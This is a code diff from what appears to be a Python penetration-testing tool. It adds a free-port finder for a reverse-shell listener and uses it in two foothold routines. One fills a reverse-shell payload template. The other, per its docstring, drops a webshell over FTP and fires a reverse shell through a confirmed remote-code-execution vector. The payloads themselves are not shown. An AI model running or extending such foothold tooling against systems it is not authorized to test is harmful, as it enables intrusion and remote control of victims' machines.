@@ -8355,6 +8355,26 @@ def _foothold_lhost(target_ip: str) -> "str | None":
         return None
 
 
+def _free_local_port(preferred: int = 4444, span: int = 50) -> int:
+    """Return a locally-bindable TCP port for a reverse-shell listener: the preferred one if it's
+    free, else the next free port above it (probes the same way the listener binds — SO_REUSEADDR
+    on 0.0.0.0 — so a success here means the listener will bind too). Falls back to preferred."""
+    import socket
+    for cand in [preferred] + [preferred + i for i in range(1, span + 1)]:
+        if not 1 <= cand <= 65535:
+            continue
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("0.0.0.0", cand))
+            return cand
+        except OSError:
+            continue
+        finally:
+            s.close()
+    return preferred
+
+
 def _foothold_channel(ip: str, port: int, proto: str):
     """Rebuild a working command channel from a confirmed echo-based cmdi vector. Returns
     (run(cmd)->output, fire(cmd)->None, description) or None. `run` captures stdout between
@@ -8489,7 +8509,10 @@ def _tool_foothold(ip: str, port: int, proto: str) -> str:
         pin = input(f"{BOLD}LPORT{RESET} [4444]: ").strip()
     except (EOFError, KeyboardInterrupt):
         return "foothold: aborted"
-    lport = int(pin) if pin.isdigit() and 1 <= int(pin) <= 65535 else 4444
+    want = int(pin) if pin.isdigit() and 1 <= int(pin) <= 65535 else 4444
+    lport = _free_local_port(want)
+    if lport != want:
+        print(f"  {YELLOW}port {want} is in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} instead{RESET}")
 
     payload = tpl.replace("{ip}", lhost).replace("{port}", str(lport))
     upgrade = b"" if pty else _FOOTHOLD_UPGRADE.encode()
@@ -11085,10 +11108,12 @@ def _ftp_fh_backdoor(ip: str, ftp_port: int) -> str:
 def _ftp_fh_webrce(ip: str, port: int, proto: str) -> str:
     """Over the confirmed FTP→web RCE, drop a webshell via FTP, spawn a listener, fire a reverse shell."""
     import io
-    lhost, lport = _foothold_lhost(ip), 4444
+    lhost, lport = _foothold_lhost(ip), _free_local_port(4444)
     if not lhost:
         print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
         return "ftp-foothold: no LHOST"
+    if lport != 4444:
+        print(f"{YELLOW}port 4444 is in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
     web = next((o for s, o in fetch_scripts(ip, port, "tcp") if s == "ftp-webshell"), "")
     served = re.search(r"✗ SERVED (\S+) → (\S+)", web)
     rce = re.search(r"✗ RCE (\w+) ", web)
